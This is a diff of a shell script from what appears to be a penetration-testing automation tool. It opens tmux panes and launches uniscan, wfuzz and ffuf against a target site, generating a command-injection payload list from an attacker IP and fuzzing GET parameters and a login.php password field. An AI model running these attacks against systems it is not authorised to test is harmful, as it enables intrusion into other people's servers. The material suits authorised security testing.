@@ -1175,6 +1175,7 @@ tmux split-window -h -t "1.1"
 tmux split-window -h -t "1.1"
 tmux select-pane -t "1.4"
 tmux split-window -h -t "1.4"
+tmux split-window -h -t "1.4"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:1.0 "# automate command injection scan" Enter
 tmux send-keys -t PT:1.0 "sudo uniscan -u http://$site -qweds"
@@ -1190,11 +1191,13 @@ cd $folderProjectEngine
 python ./cmdGenerator.py $attackerIP cmdlist.txt
 mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
 cd $folderProjectWebAuthN
-sleep 1
-tmux send-keys -t PT:1.4"# command injection automation (GET)" Enter
-tmux send-keys -t PT:1.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
-tmux send-keys -t PT:1.5 "# command injection automation (POST)" Enter
-tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
+#sleep 1
+tmux send-keys -t PT:1.4"# command injection automation (save burp file with name: burp.req)" Enter
+tmux send-keys -t PT:1.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-command-injection-list.txt"
+tmux send-keys -t PT:1.5"# command injection automation (GET)" Enter
+tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
+tmux send-keys -t PT:1.6 "# command injection automation (POST)" Enter
+tmux send-keys -t PT:1.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
 cd $folderProject
 
 
